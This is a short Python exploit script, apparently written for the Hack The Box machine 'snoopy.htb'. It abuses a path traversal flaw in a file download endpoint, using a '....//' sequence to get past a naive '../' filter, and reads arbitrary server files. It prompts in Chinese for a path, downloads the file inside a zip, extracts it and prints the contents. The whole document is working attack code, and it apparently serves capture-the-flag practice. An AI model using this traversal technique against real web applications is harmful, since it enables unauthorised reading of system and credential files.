import httpx
import zipfile


header={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
while True:
    f = str(input('请输入需要读取的文件路径([q]退出):'))
    if f !='q':
        with httpx.Client() as reqclient:
            req=reqclient.request(headers=header,url='http://snoopy.htb/download?file=....//....//....//..../'+f,method='GET')
            with open('a.zip','wb') as ob:
                ob.write(req.content)
            with zipfile.ZipFile('a.zip') as zip:
                print(zip.namelist())
                a=zip.namelist()
                zip.extractall('./')
            b=open(f.split('/')[-1],'wb')
            c=open(a[0],'rb')
            b.write(c.read())
            b.close()
            print(open(f.split('/')[-1],'r').read())
    else:
        break
